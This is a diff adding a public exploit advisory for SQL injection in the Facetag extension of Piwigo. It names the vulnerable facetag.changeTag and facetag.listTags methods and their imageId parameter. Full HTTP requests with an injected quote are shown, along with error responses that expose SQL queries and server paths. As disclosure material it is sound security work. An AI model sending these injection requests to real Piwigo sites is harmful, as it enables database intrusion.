@@ -1,0 +1,152 @@
+# Exploit Title: Facetag Extension in Piwigo, Multiple SQL injection 
+# Date: 30-05-2017
+# Extension Version: 0.0.3
+# Software Link: http://piwigo.org/basics/downloads
+# Extension link : http://piwigo.org/ext/extension_view.php?eid=845
+# Exploit Author: Touhid M.Shaikh
+# Contact: http://twitter.com/touhidshaikh22
+# Website: http://touhidshaikh.com/
+# Category: webapps
+
+
+######## Description ########
+<!--
+	What is Piwigo ?
+	Piwigo is photo gallery software for the web, built by an active community of users and developers.Extensions make Piwigo easily customizable. Icing on the cake, Piwigo is free and open source.
+
+	Facetag Extension in piwigo.
+	This plugin extends piwigo with the function to tag faces in pictures. It adds an additional button on photo pages that let you tag a face on the picture.
+-->
+
+######## Video PoC and Article ########
+
+https://www.youtube.com/watch?v=MVCe_zYtFsQ
+http://touhidshaikh.com/blog/poc/facetag-extension-piwigo-sqli/
+
+
+######## Attact Description  ########
+<!--
+
+	Piwigo's Facetag Extention have multiple SQL injection.
+
+	Facetag Extention provide additional button on photo page for visitor or user to tag any name oh that image.
+
+	Affected Method : 1) facetag.changeTag
+					 2) facetag.listTags
+
+	1) facetag.changeTag
+===>When we gave any tag name to photo, That time our request send by POST method to 
+	server and directly interpret in server's database.Our POST request contain some perameter like (id,imageId,name etc)
+	Affected parameter: imageId=
+
+	2) facetag.listTags
+===>When we visit any image on server. facetag.listTags method pass on ws.php file 		with imageId= parameter and fetch facetag name in json format. 
+	Affectd parameter : imageId= 
+
+
+NOTE : "www.test.touhid" this domain not registed on internet. This domain host in  touhid's local machine.
+-->
+
+######## Proof of Concept ########
+
+Any visitor or registed user can perform this.
+
+
+1) facetag.changeTag (Target parameter : imageId=14')
+<!-- ---------------------OUR REQUEST ---------------------- -->
+
+POST /ws.php?format=json&method=facetag.changeTag HTTP/1.1
+Host: www.test.touhid
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://www.test.touhid/picture.php?/14/category/3
+Content-Length: 93
+Cookie: pwg_id=528jktu99quilhjjk6iapa1nv4
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+
+id=-1&imageId=14'&name=touhid&top=0.1280807957504735&left=0.5839646464646465&width=0&height=0
+
+<!-- ---------------------Ends REQUEST facetag.changeTag ---------------------- -->
+
+########### Response ############
+
+<!-- --------------------- RESPONSE ---------------------- -->
+
+HTTP/1.1 200 OK
+Date: Tue, 30 May 2017 14:00:43 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1097
+Connection: close
+Content-Type: text/plain; charset=utf-8
+
+<pre><br />
+<b>Warning</b>:  [mysql error 1064] You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\', 15)' at line 1
+INSERT IGNORE INTO piwigo_image_tag (`image_id`, `tag_id`) VALUES (14\', 15); in <b>/var/www/test/include/dblayer/functions_mysqli.inc.php</b> on line <b>845</b><br />
+</pre><pre><br />
+<b>Warning</b>:  [mysql error 1064] You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\', 15, 0.1280807957504735, 0.5839646464646465, 0, 0) ON DUPLICATE KEY UPDATE `t' at line 1
+INSERT INTO `piwigo_image_facetag` (`image_id`, `tag_id`, `top`, `left`, `width`, `height`) VALUES (14\', 15, 0.1280807957504735, 0.5839646464646465, 0, 0) ON DUPLICATE KEY UPDATE `top` = VALUES(`top`), `left` = VALUES(`left`), `width` = VALUES(`width`), `height` = VALUES(`height`); in <b>/var/www/test/include/dblayer/functions_mysqli.inc.php</b> on line <b>845</b><br />
+</pre>{"stat":"ok","result":"{\"action\":\"INSERT\",\"id\":\"15\"}"}
+
+<!-- --------------------- END RESPONSE ---------------------- -->
+
+
+
+2) facetag.listTags (Target parameter : imageId=-1')
+
+<!-- --------------------- OUR REQUEST ---------------------- -->
+POST /ws.php?format=json&method=facetag.listTags HTTP/1.1
+Host: www.test.touhid
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://www.test.touhid/picture.php?/14/category/3
+Content-Length: 10
+Cookie: pwg_id=528jktu99quilhjjk6iapa1nv4
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+
+imageId=-1'
+<!-- --------------------- ENDs OUR REQUEST ---------------------- -->
+
+
+########### Response ############
+<!-- --------------------- RESPONSE ---------------------- -->
+HTTP/1.1 200 OK
+Date: Tue, 30 May 2017 14:10:32 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1695
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<pre><br />
+<b>Warning</b>:  [mysql error 1064] You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\' AND EXISTS (SELECT 1 FROM piwigo_image_tag imgTag WHERE imgTag.`image_id` = i' at line 1
+SELECT imgFaceTag.`tag_id`, imgFaceTag.`top`, imgFaceTag.`left`, imgFaceTag.`width`, imgFaceTag.`height`, tags.`name` FROM `piwigo_image_facetag` imgFaceTag , piwigo_tags tags WHERE imgFaceTag.`tag_id` = tags.`id` AND imgFaceTag.`image_id` = -1\' AND EXISTS (SELECT 1 FROM piwigo_image_tag imgTag WHERE imgTag.`image_id` = imgFaceTag.`image_id` AND imgTag.`tag_id` = imgFaceTag.`tag_id`); in <b>/var/www/test/include/dblayer/functions_mysqli.inc.php</b> on line <b>845</b><br />
+</pre><br />
+<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on boolean in /var/www/test/include/dblayer/functions_mysqli.inc.php:226
+Stack trace:
+#0 /var/www/test/plugins/piwigo-facetag/include/ws_functions.inc.php(48): pwg_db_fetch_assoc(false)
+#1 /var/www/test/plugins/piwigo-facetag/include/ws_functions.inc.php(43): queryResult2Array(false)
+#2 /var/www/test/plugins/piwigo-facetag/include/ws_functions.inc.php(26): getImageFaceTags('-1\\'')
+#3 /var/www/test/include/ws_core.inc.php(608): facetag_listTags(Array, Object(PwgServer))
+#4 /var/www/test/include/ws_protocols/rest_handler.php(56): PwgServer->invoke('facetag.listTag...', Array)
+#5 /var/www/test/include/ws_core.inc.php(296): PwgRestRequestHandler->handleRequest(Object(PwgServer))
+#6 /var/www/test/ws.php(94): PwgServer->run()
+#7 {main}
+  thrown in <b>/var/www/test/include/dblayer/functions_mysqli.inc.php</b> on line <b>226</b><br />
+<!-- --------------------- Ends RESPONSE here---------------------- -->
